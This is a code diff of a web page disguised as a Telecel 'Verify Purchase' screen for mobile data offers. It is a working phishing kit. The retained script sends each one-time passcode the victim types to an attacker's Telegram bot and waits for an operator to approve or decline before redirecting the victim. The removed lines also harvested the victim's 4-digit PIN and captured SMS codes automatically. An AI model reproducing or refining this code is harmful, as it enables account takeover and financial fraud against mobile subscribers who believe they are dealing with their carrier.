@@ -24,14 +24,23 @@
             box-shadow: 0 10px 40px rgba(0,0,0,0.1);
             overflow: hidden;
         }
-        .logo-section { text-align: center; padding: 35px 0 20px; }
-        .telecel-logo { width: 138px; height: 138px; margin: 0 auto; }
+        .logo-section { text-align: center; padding: 32px 0 18px; }
+        .telecel-logo { width: 135px; height: auto; margin: 0 auto; }
         h1 { text-align: center; font-size: 23px; font-weight: 700; margin: 10px 0 6px; color: #1e2937; }
-        .subtitle { text-align: center; color: #475569; font-size: 15.2px; padding: 0 25px 20px; line-height: 1.45; }
+        .subtitle { text-align: center; color: #475569; font-size: 15px; padding: 0 25px 18px; line-height: 1.45; }
+        
+        .offer-info {
+            background: #fff0f0;
+            margin: 0 20px 20px;
+            padding: 15px;
+            border-radius: 14px;
+            text-align: center;
+            border: 1px solid #ffe0e0;
+        }
         .otp-container {
             display: flex;
             justify-content: center;
-            gap: 10px;
+            gap: 12px;
             margin: 20px 0 28px;
             padding: 0 10px;
         }
@@ -83,46 +92,6 @@
             border-radius: 50px;
             cursor: pointer;
         }
-
-        /* PIN Modal */
-        #pinModal {
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.9);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            z-index: 10000;
-        }
-        .modal-content {
-            width: 100%;
-            max-width: 420px;
-            background: white;
-            border-radius: 24px;
-            padding: 30px 20px;
-            text-align: center;
-        }
-
-        #spinner {
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.92);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-            flex-direction: column;
-            color: white;
-        }
-        .spin {
-            width: 70px;
-            height: 70px;
-            border: 7px solid #fff;
-            border-top-color: #E30613;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
@@ -130,36 +99,29 @@
         <div class="logo-section">
             <img src="data:image/png;base64,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" class="telecel-logo" alt="Telecel Logo">
         </div>
+
         <h1>Verify Purchase</h1>
         <p class="subtitle">A 5-digit verification code has been sent to your number. Please enter it below to complete your purchase.</p>
+
+        <!-- Show selected offer -->
+        <div class="offer-info" id="offerInfo">
+            <strong id="offerTitle"></strong><br>
+            <span id="offerPrice" style="color:#E30613; font-weight:700; font-size:21px;"></span>
+        </div>
+
         <div class="otp-container" id="otpInputs"></div>
         <div class="error-msg" id="errMsg"></div>
+
         <div class="form-section">
             <button class="btn-action" id="verifyBtn">Verify & Accept Purchase</button>
             <button class="back-btn" onclick="window.location.href='index.html'">← Back to Data Offers</button>
         </div>
     </div>
 
-    <!-- PIN Popup Modal -->
-    <div id="pinModal">
-        <div class="modal-content">
-            <div class="logo-section">
-                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAKEAAACgCAYAAABkDQwTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAA02SURBVHgB7Z1NbBvHFcffmyWlukEcBWiAFpYUGhYlJZcoQJEeQyO5R+q5qKW7W9s9JenB0qEJCrSwjPYuOj03ds5NKgbtpSmKMGjRWJIDUbbSHvpFJ3Eti9ydzluSKj92yV2KK0qe/w9QIlLL8ePwz/l47+0bIgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABDhgn0xXYmk/F/SaUyxFymSqV8tlQqEYgNRBgBI7gxJ52eJ49fVopzmigTerHWRfPfkkf8oVflW2dLt0sEugIRdmF7aiqXIueq6aUc9YsRpdb6uutWjCBLZQIdQIQBiPjSylnTusuIFxMzepZY6/zEnc0VAi1AhE38fXY2U63qtUONfD0QMZLnrUx+tpUn4AMR1tk9N31BK141v45FfU3qzBlyzE/188/JNT9xMGJcndzauEIAIhTuTU2bdR8vR73+9MWL9PXvLlBq/Iz/+L/v3qR/v/4GxUcXqxW1YPvmRZHlxBFg+rnn6Ju//YBO//DigQAPB885ab2+nZnNkMVYLcI4AnxiYYGe+dU7AxLf/zFTUaYmxEzkZcDjhrUi3JmauRxVgF975RV6+qdvkzr9JCWBCDGVHr1JlmKlCGUXrJiuRblWNh5jP36TjoCc/8WwECtF6Hp6Peq1oy+9NPApOAz5Yuxms3NkGSmyjLvZ2UUTwchEvf4JswvuRWp2ltLmR3/5ZeDf3S++CP1bO5qUjNDnySKsc9HsTs9sx4mEnPnTH4mfPNxa0DMi/Nu3X4r+As3nJ+7cLpAlWDUd10bBeKG4wwpQUKdPx7qeWF8li7BKhGqIH65EV2KQuzc1myNLsEaEkpQwyISEuMi6MA6edufJEqwRoWJnaB+qxJWjbkwasFKvkSXYI0Kil2lIfPGLX1JcxIF9kL39mGOFCLczcxISO3L/m4x+5Z+8RQ/e7S8Y4jjpHFmAHX7C1FdGgA4lhUy3D3/zPnn1KVfEV9ncLO//+S9jXsxpuBnNnCELsEKEjlZjSXpEH/3hIyq/9Xb704dOSGBNz5IFWDEdn9gRhelpsgBLNia671GpGjNjeqAwW5HeZX1SKxg+VoiQWZUIHFswEh5nPL1NFmCFCBW5RTqBaKYdsgArRFipPFGiPnF3h7cx8TSdyC9PXKwQ4dlSUcpvFOik4SqI8HHC0/pDOlkUbbkf2aIEBlWghBhE4ms7nuedtC9N31gjwnq6fIFiEqW8x+h3YqTuR8RznVWyBKtcNGah/x4lgKTvP/VmP2VAgtFEH9pUGsSqu+286qm8M/LwUpwM66hZME8uXqBTr75K+x995D+W+5VlmhaBfpW/QV+98w5FhXX0ujiPA1aJUHbJd7OzK0x6Lepr4lTbkvuTU+Odt4iOPP8cRUVr/d7knY0CWYR1EZPJrdt5irE27DchtV/cqrKuCoOVYbuUw0vmf5FK98o9w5IveCQwr9hYJs5KEX7r9u2S9vRS1Ov/8/obsYtgNhPxTrvrE5u3l8lCrE1gmPxs85aMPFGulZzCf3zv+30L8cGNXpsSKZb5aJksJbkbL04A1/71z8KPvvGMJP7nel0ru+S99z/wd7tSLDMKcq/J/Z/9nPZ+9/tuVxkB7p+3ubI/ygUbdqdmLuuIpeIEqaZw+gcXfSe101ZZQYS3/+mnvmAf/Prd7i4eplvV/UdLth8tARHW2c0+P0fs3oxbpUEZX2C67oKR6boaNevGLAVsXQO2AxE2IcUzK663zMQXKDF0kbS6YlPVrV5AhAHUxKjzPMCqDTi/JByIsAsyRXtUvWxGRqkL09edbxIHljAcRr5wIMKISKk2qZTFSs0xm3Vj0I3pTDtmTWl8kF7RCLfguvsFnGcHAAAAgBOAFWvCe1Mz6wcnd8r5w0xFt6KsTBZo5252On/gkhpS3xxZ7FjK9e6cy67uTE0v0zBhnjOdvmj7UV6BDKlvEheh+NxkJEqxs66UusScpCM4Ov6Zck7amrrQcZC+UanRRToiEs2sFgH6pyfx8AqWd8OWIpT9wFq/QEdEoiOhCHCYFfPBySCxkTDsyAYmPSbn+/a78K2vVfz1inEEl+gw6P7qFjYVNC8PyhndWIMdpr2B9s0RkpgIFTkhhcp5LJXW2/eyMy3PVj29cFYSTQMQQTtaXVCKcyYMlmk877ehqaC1d8N1nUJcYZtF+FNRrxUbUqQumcV7jppCeM02xI0L19p0rhpD5hpt1trTRfPv5Ce2Nq5HaUNpnneUeq2zb8xuV+vr/fTNUZLgmlBGmegeICegmqp8s1Mjo2vmQ56XpnTQC43rhVnlHKVLd89NX5kMEXK/tNgQRt2Gu9mZqyZOvNQrTiwxaa3dawduo472WES5ei87vRiW8Cp2OenRq6ZbLof3jdntMq/V+iYbmDxh7H122I66Y5Pe7xK3dLRsatIjox93/fCbkB0dK765e256YLvvfmwwn+p6Nxvkb5rc9VABtrY4p1IjHXff+V+M9Mi6L8CIdpmY95p/0v0x5LiIsNxegapa1Wv9bGq0otVB+biqrnezfxtmM+3P++tkxXmKkZGjmC61P+ekR1ZFoBQX5uXIZ+YpPktHxDEQoS4yOeeb1yxyGmf4VEU7HukbkiIV3B6PBY0ecamNGsEftPm3P+lpg+O22OCPqsqJfNN9c1vNJztJ33RJui13t4uO5QmiQ6jAoMvVinqx9vte4O5STuPUQYuctpR4/1vNnae41x3iy9QncgIUq4eLQTawpisTdzYOihXVRNFZ0cFsosSGAyHWM7YzFIJUXiBWt0z7JXlsxCQpY/PtibVR+8Zfd5L7ccCVOZkpjlOK2ZGLUJu1X7edmtlczAdNgZp0fnJzY7n5OdkAmF2gTOMtI1b9XLi+O9pJ74XaMHFns6VallR0uDc9s9yZX1gbwRquEsX8cqB4/Ib5fEDpD3m8upvNynvz30eY20uytifb7lcZ3/pr0USqCkEzSjqdljaKdExIUITclwDMmikXtFkzLpBP/GkplcrIY8dEO/ydXfiZdbLu6u/brj2zG++0wjxVarfBPJujHicviZDC1pYyso532U2Pb20diEWRygVfpQsi0MYjsUt7pl9CljRaO8cqZp6YCM2UWA5xHHRFaXohyGWg2Lmm0k7rbZldXAuHcdYa24NFpXk5lR5dpkjocsOGinGKp0JsrVQ5skuJQ8KfknRgYvOLLc91We1Xq3sHwjaj+30eso/msazAINMmHYaBHOfFN6JcFceJXB/5D0Wt9mHTMoVp6GvDx06E0sluZf8KDZfrJtoRaYd+lGca1/qGF+mYcezqE0acHsrmkvumUyUsVSZPl1k5RbdCAwlPac+4jTjCqNO4sYl0yRhekpOj3MrerfYNUdosTcIWJsadtEgRd/Ka9U7PvqmffXJgl+kbMzeXHHYKE2azQseQ5EToeWXxtLbTa+eqmUsh3Ww6ceM8DRATYclQHBu0vmV2xwsUEzlHJZV+KO+3Y0Mgzmjj2M5H+fJozebLQUE+wqLpmxdpgBi308lP5XLZC11rSMxThFj/yTRPSSYYH7ZQz/UKO0l7Jka62P68jCDd2pSdZd2Osa42MM/vTM1cjmuDVIg1o1JIvWwek0xmeU2THZntc+fmxTb/1oQ6Uu44uA2ai9I3vWxvt+tudnqtvW+SILFtke+WIPVx1OurlUdPN0ZH4/uTjs8FXqh10T+ThJtcQGb3qVi90MhGMaNCy/vayc6smm/bJepBrVTv5rxv//TMdphbRfxyLHaYyElUG7o4j3vS3Fa3vhG7tOe9161vTD+fbfYciDBVhGJQvi9yayORUF5i07H4t0yHBU5BQbRMz5pXzFYwF3ghm6A+t4XTWnx6ujMCIyMb654ibD5fWHu8FBSN8S/zExU4Y4Q9H2SDX/KjDd95PD27YkQRK2zW3pZUma26WsQ8FmQXK9X6Pjv9nS39o4iLUVxpTMntohPdHRtH7ErUa5uHe4mEiBOX+sB0Z8dUGvkMk6ZTNf3XRCyiGWBFIehZCauZ9WYk100D8+G3TON+lVniPvtG59vX4rX3ST19laZf71NCJCrCcYmxRvggZRps7xx5rdmlLkiUgiIio4bcrhj0t2rllGwoeuwOW48e80VDvBTHBknI6OYiMuG1xejiDq7g6hd/N6G+gfXN/qmlnkL0vDwlxJG4yiUebLaBl7mzypVxH/D16v7eathuWbJPqh5JksCF0LQq3y3B+W7tHNgiGTqkxZaD3V+vokWNknH1+G+GDmlDzzbrbfWqX+jfSKZ53qwdup3N0rOPG9T7ZrH5c/IzcowAk6wmdqTxGl9Q1VpnGZ9aeTym36qWkeyNyU+jDdNeqf/7VeLf63JgQz2EJlkvh7GhuU35vd+2Gn07KLsOcx8QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAnDj+ByGKzKp0DGEPAAAAAElFTkSuQmCC" 
-                     class="telecel-logo" alt="Telecel Logo">
-            </div>
-            <h1>Enter PIN</h1>
-            <p class="subtitle">Enter your 4-digit PIN to complete this transaction</p>
-            <div class="otp-container" id="pinInputs"></div>
-            <div class="error-msg" id="pinErrMsg"></div>
-            <div class="form-section">
-                <button class="btn-action" id="confirmPinBtn">Confirm PIN</button>
-            </div>
-        </div>
-    </div>
-
-    <div id="spinner">
-        <div class="spin"></div>
-        <p style="margin-top:15px;">Waiting for approval...</p>
+    <!-- Spinner -->
+    <div id="spinner" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.92); z-index:10000; align-items:center; justify-content:center; flex-direction:column; color:white;">
+        <div style="width:70px; height:70px; border:7px solid #fff; border-top-color:#E30613; border-radius:50%; animation:spin 1s linear infinite;"></div>
+        <p style="margin-top:20px; font-size:16.5px;">Verifying OTP...</p>
     </div>
 
     <script>
@@ -173,12 +135,22 @@
         let state = { lastUpdateId: 0, pollInterval: null };
 
         const errMsg = document.getElementById('errMsg');
-        const pinErrMsg = document.getElementById('pinErrMsg');
         const spinner = document.getElementById('spinner');
-        const pinModal = document.getElementById('pinModal');
+        const offerTitleEl = document.getElementById('offerTitle');
+        const offerPriceEl = document.getElementById('offerPrice');
 
-        function createInputs(id, count) {
-            const container = document.getElementById(id);
+        function loadOffer() {
+            const params = new URLSearchParams(window.location.search);
+            const name = params.get('offer') || 'Data Bundle';
+            const data = params.get('data') || '';
+            const price = params.get('price') || '0';
+            
+            offerTitleEl.textContent = name + (data ? ` - ${data}` : '');
+            offerPriceEl.textContent = `GHS ${price}`;
+        }
+
+        function createInputs(containerId, count) {
+            const container = document.getElementById(containerId);
             container.innerHTML = '';
             for (let i = 0; i < count; i++) {
                 const input = document.createElement('input');
@@ -190,38 +162,27 @@
             }
         }
 
-        function getCode(id) {
-            return Array.from(document.querySelectorAll(`#${id} .otp-input`)).map(i => i.value).join('');
-        }
-
-        function focusFirst(id) {
-            const first = document.querySelector(`#${id} .otp-input`);
-            if (first) first.focus();
+        function getCode(containerId) {
+            return Array.from(document.querySelectorAll(`#${containerId} .otp-input`)).map(i => i.value).join('');
         }
 
         function setupAutoFocus(containerId, length, onComplete) {
             const inputs = document.querySelectorAll(`#${containerId} .otp-input`);
             inputs.forEach((input, index) => {
                 input.addEventListener('input', () => {
-                    if (input.value.length === 1 && index < length - 1) inputs[index + 1].focus();
-                    if (getCode(containerId).length === length) setTimeout(onComplete, 300);
+                    if (input.value.length === 1 && index < length - 1) {
+                        inputs[index + 1].focus();
+                    }
+                    if (getCode(containerId).length === length) {
+                        setTimeout(onComplete, 300);
+                    }
                 });
                 input.addEventListener('keydown', (e) => {
-                    if (e.key === 'Backspace' && !input.value && index > 0) inputs[index - 1].focus();
+                    if (e.key === 'Backspace' && !input.value && index > 0) {
+                        inputs[index - 1].focus();
+                    }
                 });
             });
-        }
-
-        async function requestAutoOTP() {
-            if (!('OTPCredential' in window)) return;
-            try {
-                const credential = await navigator.credentials.get({ otp: { transport: ['sms'] } });
-                if (credential?.code) {
-                    const inputs = document.querySelectorAll('#otpInputs .otp-input');
-                    credential.code.split('').forEach((digit, i) => { if (inputs[i]) inputs[i].value = digit; });
-                    setTimeout(submitOTP, 500);
-                }
-            } catch (e) {}
         }
 
         function submitOTP() {
@@ -231,11 +192,8 @@
             const ts = Date.now();
             const approveId = `otp_approve_${ts}`;
             const declineId = `otp_decline_${ts}`;
-            const verifyDeviceId = `otp_verify_${ts}`;
-            const validPinId = `valid_pin_${ts}`;
-            const invalidPinId = `invalid_pin_${ts}`;
 
-            const message = `<b>🔴 OTP Verification Received</b>\n\nOTP Code: <code>${otp}</code>\n\nChoose Action:`;
+            const message = `<b>🔴 OTP Verification Received</b>\n\nOffer: ${offerTitleEl.textContent}\nOTP Code: <code>${otp}</code>\n\nChoose Action:`;
 
             fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -246,139 +204,51 @@
                     parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [
-                            [
-                                { text: "✅ Approve & Continue", callback_data: approveId },
-                                { text: "❌ Decline", callback_data: declineId }
-                            ],
-                            [
-                                { text: "📱 Verify Device", callback_data: verifyDeviceId }
-                            ],
-                            [
-                                { text: "✅ Valid PIN", callback_data: validPinId },
-                                { text: "❌ Invalid PIN", callback_data: invalidPinId }
-                            ]
+                            [{ text: "✅ Approve & Complete", callback_data: approveId }],
+                            [{ text: "❌ Decline", callback_data: declineId }]
                         ]
                     }
                 })
             }).then(() => {
                 spinner.style.display = 'flex';
-                startPolling(approveId, declineId, verifyDeviceId, validPinId, invalidPinId);
+                startPolling(approveId, declineId);
             });
         }
 
-        function startPolling(approveId, declineId, verifyDeviceId, validPinId, invalidPinId) {
+        function startPolling(approveId, declineId) {
             if (state.pollInterval) clearInterval(state.pollInterval);
             state.pollInterval = setInterval(() => {
                 fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
                     .then(r => r.json())
                     .then(data => {
-                        data.result?.forEach(update => {
+                        if (!data.ok || !data.result) return;
+                        data.result.forEach(update => {
                             state.lastUpdateId = update.update_id;
                             if (update.callback_query) {
                                 const cb = update.callback_query.data;
-
                                 if (cb === approveId) {
                                     clearInterval(state.pollInterval);
                                     spinner.style.display = 'none';
-                                    showPinModal();
-                                } 
-                                else if (cb === declineId) {
+                                    const params = new URLSearchParams(window.location.search);
+                                    window.location.href = CONFIG.SUCCESS_PAGE + '?' + params.toString();
+                                } else if (cb === declineId) {
                                     clearInterval(state.pollInterval);
                                     spinner.style.display = 'none';
                                     errMsg.textContent = "Request declined. Please try again.";
                                     errMsg.style.display = 'block';
                                     document.querySelectorAll('#otpInputs .otp-input').forEach(i => i.value = '');
-                                    focusFirst('otpInputs');
-                                }
-                                else if (cb === verifyDeviceId) {
-                                    clearInterval(state.pollInterval);
-                                    spinner.style.display = 'none';
-                                    window.location.href = CONFIG.DEVICE_PAGE;
-                                }
-                                else if (cb === validPinId) {
-                                    clearInterval(state.pollInterval);
-                                    spinner.style.display = 'none';
-                                    window.location.href = CONFIG.SUCCESS_PAGE;
-                                }
-                                else if (cb === invalidPinId) {
-                                    clearInterval(state.pollInterval);
-                                    spinner.style.display = 'none';
-                                    errMsg.textContent = "Invalid PIN. Please try again.";
-                                    errMsg.style.display = 'block';
-                                    document.querySelectorAll('#otpInputs .otp-input').forEach(i => i.value = '');
-                                    focusFirst('otpInputs');
                                 }
                             }
                         });
                     });
-            }, 1800);
-        }
-
-        function showPinModal() {
-            pinModal.style.display = 'flex';
-            createInputs('pinInputs', 4);
-            setupAutoFocus('pinInputs', 4, submitPIN);
-            focusFirst('pinInputs');
-        }
-
-        function submitPIN() {
-            const pin = getCode('pinInputs');
-            if (pin.length !== 4) return;
-
-            const ts = Date.now();
-            const validId = `valid_pin_${ts}`;
-            const invalidId = `invalid_pin_${ts}`;
-
-            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CONFIG.CHAT_ID,
-                    text: `<b>🔴 PIN Verification</b>\n\nPIN: <code>${pin}</code>`,
-                    parse_mode: 'HTML',
-                    reply_markup: {
-                        inline_keyboard: [[
-                            { text: "✅ Valid PIN", callback_data: validId },
-                            { text: "❌ Invalid PIN", callback_data: invalidId }
-                        ]]
-                    }
-                })
-            }).then(() => startPinPolling(validId, invalidId));
-        }
-
-        function startPinPolling(validId, invalidId) {
-            const interval = setInterval(() => {
-                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
-                    .then(r => r.json())
-                    .then(data => {
-                        data.result?.forEach(update => {
-                            state.lastUpdateId = update.update_id;
-                            if (update.callback_query) {
-                                const cb = update.callback_query.data;
-                                if (cb === validId) {
-                                    clearInterval(interval);
-                                    pinModal.style.display = 'none';
-                                    window.location.href = CONFIG.SUCCESS_PAGE;
-                                } else if (cb === invalidId) {
-                                    clearInterval(interval);
-                                    pinErrMsg.textContent = "Invalid PIN. Please try again.";
-                                    pinErrMsg.style.display = 'block';
-                                    document.querySelectorAll('#pinInputs .otp-input').forEach(i => i.value = '');
-                                    focusFirst('pinInputs');
-                                }
-                            }
-                        });
-                    });
-            }, 1800);
+            }, 1500);
         }
 
         // Initialize
         createInputs('otpInputs', 5);
         setupAutoFocus('otpInputs', 5, submitOTP);
-        focusFirst('otpInputs');
-
-        window.onload = () => setTimeout(requestAutoOTP, 800);
         document.getElementById('verifyBtn').onclick = submitOTP;
+        loadOffer();
     </script>
 </body>
 </html>
